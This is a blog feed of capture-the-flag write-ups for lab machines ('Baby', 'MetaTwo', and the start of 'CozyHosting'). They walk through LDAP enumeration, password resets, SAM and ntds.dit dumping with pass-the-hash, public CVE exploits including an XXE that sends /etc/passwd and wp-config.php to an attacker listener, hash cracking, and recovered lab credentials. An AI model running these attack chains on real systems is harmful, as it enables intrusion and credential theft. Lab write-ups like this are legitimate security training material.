        <content type="html"><![CDATA[<h2 id="Namap-Scan"><a href="#Namap-Scan" class="headerlink" title="Namap Scan"></a>Namap Scan</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65514 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-06 14:47:47Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br><span class="line">| Issuer: commonName=BabyDC.baby.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-05T14:31:02</span><br><span class="line">| Not valid after:  2025-09-04T14:31:02</span><br><span class="line">| MD5:   48f2:c223:e5c4:356d:b768:8571:f1c6:8950</span><br><span class="line">| SHA-1: 03fd:ff73:d5e1:92bd:32bf:d747:c3fb:bb46:ff4e:6d2d</span><br><span class="line">|_ssl-date: 2025-03-06T14:49:20+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY</span><br><span class="line">|   NetBIOS_Domain_Name: BABY</span><br><span class="line">|   NetBIOS_Computer_Name: BABYDC</span><br><span class="line">|   DNS_Domain_Name: baby.vl</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">|   DNS_Tree_Name: baby.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-06T14:48:39+00:00</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55620/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">59532/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 29424/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 15632/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 18953/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 41352/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-06T14:48:41</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h2 id="FOOTHOLD"><a href="#FOOTHOLD" class="headerlink" title="FOOTHOLD"></a>FOOTHOLD</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>After some enumeration we found that ldap had null session active</p><p><img src="/images/Baby/LDAP-ACCESS-NULL.png" alt="LDAP Access Null"></p><p>After running a query on the hole ldap with the below command we found that one user had a description field with a initial password <code>BabyStart123!</code>. We will try to use that password for the user teresa.bell and if it doesn’t work we will spray it to the rest of the users</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Teresa Bell, it, baby.vl</span><br><span class="line">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">cn: Teresa Bell</span><br><span class="line">sn: Bell</span><br><span class="line">description: Set initial password to BabyStart123!</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/LDAP-DISCR-PASSWORD.png" alt="LDAP Password Description"></p><p>The creds we found for Teresa.Bell but they dont work, so we will gather all of the users and password spray. We gathered the account names threw the below search BUT it was not the correct way:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;(objectClass=user)&quot; sAMAccountName -LLL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Getting-all-users.png" alt="Getting All Users"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Jacqueline.Barnett</span><br><span class="line">Ashley.Webb</span><br><span class="line">Hugh.George</span><br><span class="line">Leonard.Dyer</span><br><span class="line">Connor.Wilkinson</span><br><span class="line">Joseph.Hughes</span><br><span class="line">Kerry.Wilson</span><br><span class="line">Teresa.Bell</span><br></pre></td></tr></table></figure><p>We tried the usernames we gathered but it didnt work in any of them, we tried a more broad ldap search and another user popped up &#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;user&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Hit-on-account(passchange).png" alt="Hit on Account Password Change"></p><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>The flag <code>STATUS_PASSWORD_MUST_CHANGE</code> tells us that we first need to change the password before we are able to log in to that user.Using the <code>smbpasswd</code> tool we were able to change Carolines password to <code>Password123!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbpasswd -r 10.10.114.53 -U &#x27;Caroline.Robinson&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Password_Change_Car.png" alt="Password Change Caroline"><img src="/images/Baby/netexec-after-pass-change.png" alt="Netexec After Password Change"></p><p>We can check if we have winrm access using the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm 10.10.114.53 -u Caroline.Robinson  -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Winrm-access.png" alt="Winrm Access"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Caroline.Robinson -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>The user we got has the SeBackupPrivilege flag anabled<br><img src="/images/Baby/sebackupriv.png" alt="SeBackupPrivilege"><br>Now we can copy the sam and system hive of HKLM and crack them lockaly</p><p>Create a temp directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir C:\temp</span><br></pre></td></tr></table></figure><p>Copy the sam and system hive of HKLM to C:\temp and then download them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam C:\temp\sam.hive</span><br></pre></td></tr></table></figure><p>and</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\temp\system.hive</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Save-huve.png" alt="Save Hive"><br>Go on the temp folder and download the system and the sam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download sam.hive</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>Finally use impacket-secretsdump and obtain the ntlm hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Cracked-admin-ash.png" alt="Cracked Admin Hash"><br>Now we can login using evil-winrm and get the root flag<br><img src="/images/Baby/Not-working.png" alt="Not Working"></p><h3 id="NTDS-DIT"><a href="#NTDS-DIT" class="headerlink" title="NTDS.DIT"></a>NTDS.DIT</h3><p>We can see that we cannon log into the machine as the hash we got is for the local administrator. We have to get the hash of the account in the domain (which has exactly the same name). In order to do this, we have to grab “ntds.dit” aswell</p><p>Using this script to copy the ntds.dit (xct script)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># save this in script.txt </span><br><span class="line">set metadata C:\Windows\Temp\meta.cabX </span><br><span class="line">set context clientaccessibleX </span><br><span class="line">set context persistentX </span><br><span class="line">begin backupX </span><br><span class="line">add volume C: alias cdriveX </span><br><span class="line">createX </span><br><span class="line">expose %cdrive% E:X </span><br><span class="line">end backupX</span><br></pre></td></tr></table></figure><p>Then we will run the below commands to get the ntds.dit from the “snapshot” we made</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># run diskshadow diskshadow /s script.txt </span><br><span class="line"># copy ntds to c robocopy /b E:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure><p>After downloading the <code>ntds.dit</code> to our local machine and run secretsdump again</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Got-admin-hash.png" alt="Got Admin Hash"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92">https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-MetaTwo</title>
      <link href="/2024/11/06/HTB-MetaTwo/"/>
      <url>/2024/11/06/HTB-MetaTwo/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p><code>nmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]</span><br><span class="line">|     Invalid command: try being more creative</span><br><span class="line">|_    Invalid command: try being more creative</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)</span><br><span class="line">|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)</span><br><span class="line">|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://metapress.htb/</span><br></pre></td></tr></table></figure><h1 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h1><p>Domain &#x3D; <code>metapress.htb</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.186 metapress.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><p>Its wordpress so we can do a basic scan with the tool <code>wpscan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://metapress.htb/</span><br></pre></td></tr></table></figure><p>The scan gave us some good info like <code>WordPress version 5.6.2</code> and  <code>PHP/8.0.24</code><br>Potential CVE if we manage to get a user CVE-2021-29447<br><a href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p><h1 id="Event-Form"><a href="#Event-Form" class="headerlink" title="Event Form"></a>Event Form</h1><p>The even form has no SSTI. Also i tried looking into other tickets to maybe get some email adresses.<br>The request is this and the <code>appointment_id</code> the base64 encoded<br><a href="http://metapress.htb/thank-you/?appointment_id=MQ==">http://metapress.htb/thank-you/?appointment_id=MQ==</a><br><code>echo &quot;MQ==&quot; | base64 -d</code> the output was 1 I will try to brute force it in burp<br>I run the first 100 ids but nothing expect mine came back with info</p><p>Looking into the source code we find that it runs bookingpress a CVE that might works is<br><a href="https://github.com/destr4ct/CVE-2022-0739">CVE-2022-0739</a></p><p>In the poc it says we need the <code>nonce</code> we can find that if we look on the event page source code by searching <code>_wpnonce</code>.<br><img src="/images/MetaTwo/MT(nonce).png" alt="Wpnonce"><br>After running the poc we get:<br><img src="/images/MetaTwo/MT(poc).png" alt="POC"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|</span><br><span class="line">|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|</span><br></pre></td></tr></table></figure><h1 id="Cracking-the-hash"><a href="#Cracking-the-hash" class="headerlink" title="Cracking the hash"></a>Cracking the hash</h1><p>I run <code>hash-identifier</code> and i found that the hash is MD5(Wordpress)<br><img src="/images/MetaTwo/MT(Hash-id).png" alt="Hash-id"><br>With a quick search we find that the hashcat mode is 400 (from this website <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hashes.txt -m 400 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>Manager hash cracked</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</span><br></pre></td></tr></table></figure><p><code>Manager:partylikearockstar </code></p><h1 id="Manager-Dashboard"><a href="#Manager-Dashboard" class="headerlink" title="Manager Dashboard"></a>Manager Dashboard</h1><p><img src="/images/MetaTwo/MT(Manager_Dash).png" alt="ManagerDash"><br>As we can see we don’t have alot of privilages to change the website but we can upload media. From the initial recon I had found the CVE-2021-29447<br><a href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p><p>We can run the poc code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f /etc/passwd</span><br></pre></td></tr></table></figure><p>and we get a base64 encoded message<br><img src="/images/MetaTwo/MT(CVE-MEDIA).png" alt="Decode"><br>we can decode that by putting it on the <code>decode.php</code> and running</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decode.php</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(decoding).png" alt="Decoder"><br>Now we will try to get the &#x2F;wpconfig.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PoC.py -l 10.10.14.20 -p 8888 -f ../wp-config.php</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(Wp-config).png" alt="wp-cong"><br>After decoding it we find:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;FS_METHOD&#x27;, &#x27;ftpext&#x27; );</span><br><span class="line">define( &#x27;FTP_USER&#x27;, &#x27;metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_PASS&#x27;, &#x27;9NYS_ii@FyL_p5M2NvJ&#x27; );</span><br><span class="line">define( &#x27;FTP_HOST&#x27;, &#x27;ftp.metapress.htb&#x27; );</span><br><span class="line">define( &#x27;FTP_BASE&#x27;, &#x27;blog/&#x27; );</span><br><span class="line">define( &#x27;FTP_SSL&#x27;, false );</span><br></pre></td></tr></table></figure><p>the ftp username and password <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code><br>(and some db creds)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;blog&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;635Aq@TdqrCwXFUZ&#x27; );</span><br></pre></td></tr></table></figure><h1 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br></pre></td></tr></table></figure><p>Using the creds we got <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code> we can login to ftp. Inside the ftp we find another app that runs named <code>mailer</code>.  Inside there there is a file <code>send_email.php</code> we can download that file to our system with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get send_email.php</span><br></pre></td></tr></table></figure><p>In there we find user and pass and another port <code>587</code> that we didnt see on nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$mail-&gt;Host = &quot;mail.metapress.htb&quot;;</span><br><span class="line">$mail-&gt;SMTPAuth = true;                          </span><br><span class="line">$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 </span><br><span class="line">$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           </span><br><span class="line">$mail-&gt;SMTPSecure = &quot;tls&quot;;                           </span><br><span class="line">$mail-&gt;Port = 587; </span><br></pre></td></tr></table></figure><p>We can try use those creds to login via ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@metapress.htb</span><br></pre></td></tr></table></figure><p>Creds worked and we have a shell as <code>jnelson</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Doing <code>ls -la</code> we can see a folder that its not common on linux machines a <code>passpie</code> folder<br>that holds some keys<br>The passpie export command exports the credentials saved in passpie in plain text. <code>passpie export password.db</code> but we dont have the passphrase.</p><p>We will download our keys to our machine with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./keys</span><br></pre></td></tr></table></figure><p>First let us generate the password hash from the private GPG key using gpg2john and save it into a file named keys.hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg2john keys &gt; keys.hash</span><br></pre></td></tr></table></figure><p>We can now try brute-forcing the password hash and see if we can be cracked. We can use “John The Ripper” for this purpose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg</span><br></pre></td></tr></table></figure><p><img src="/images/MetaTwo/MT(johncrack).png" alt="John"><br>and we get <code>blink182</code> as passpi passphrase.</p><p>Now we can do</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passpie export ~/password.db</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/password.db</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;p7qfAZt4_A1xo_0x&#x27;</span><br><span class="line">- comment: &#x27;&#x27;</span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode &#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure><p>We got creds for root <code>root:p7qfAZt4_A1xo_0x</code> now we can just ssh to root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@metapress.htb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-CozyHosting</title>
      <link href="/2024/10/31/HTB-CozyHosting/"/>
      <url>/2024/10/31/HTB-CozyHosting/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="#Nmap"></a>#Nmap</h1><p>Let’s run an Nmap scan to discover any open ports on the remote host.<br><code>sudo nmap -Pn -sC -sV -O -T3 -p- 10.10.11.230 -oN nmap_scan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.230</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)</span><br><span class="line">|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cozyhosting.htb</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5.0</span><br><span class="line">OS details: Linux 5.0</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Nmap shows that there are 2 ports open <code>22</code> and <code>80</code>. Also the domain is <code>cozyhosting.htb</code><br>so we add the domain to our <code>/etc/hosts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.230 cozyhosting.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h1 id="Webiste"><a href="#Webiste" class="headerlink" title="#Webiste"></a>#Webiste</h1><p>Login page <a href="http://cozyhosting.htb/login">http://cozyhosting.htb/login</a></p><p>After running <code>dirsearch -u http://cozyhosting.htb/&quot;</code> we found an endpoint<br><a href="http://cozyhosting.htb/actuator">http://cozyhosting.htb/actuator</a></p><p>The endpoint revealed some good info<br><a 